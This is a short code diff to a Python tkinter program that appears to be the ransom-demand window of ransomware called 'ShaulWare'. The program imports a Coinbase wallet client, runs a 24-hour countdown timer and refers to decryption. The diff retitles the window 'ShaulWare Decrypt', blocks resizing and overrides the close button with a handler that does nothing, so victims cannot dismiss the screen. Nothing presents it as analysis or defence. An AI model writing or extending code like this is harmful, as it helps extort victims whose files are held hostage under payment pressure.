@@ -5,13 +5,18 @@ from coinbase.wallet.client import Client
 import os
 
 root = tk.Tk()
+root.title('ShaulWare Decrypt')
+root.resizable(False, False)
 canvas = tk.Canvas(root, height=800, width=1250, bg="#841212")
 canvas.pack()
 
 
-
 canDecrypt = False
 text_list = []
+
+
+def disable_event():
+    pass
 
 
 def decryption_start():
@@ -107,4 +112,5 @@ green_lock = tk.PhotoImage(file="green.png")
 timer = Timer(root=root, hours=23, minutes=59, seconds=59)
 timer.run()
 
+root.protocol("WM_DELETE_WINDOW", disable_event)
 root.mainloop()
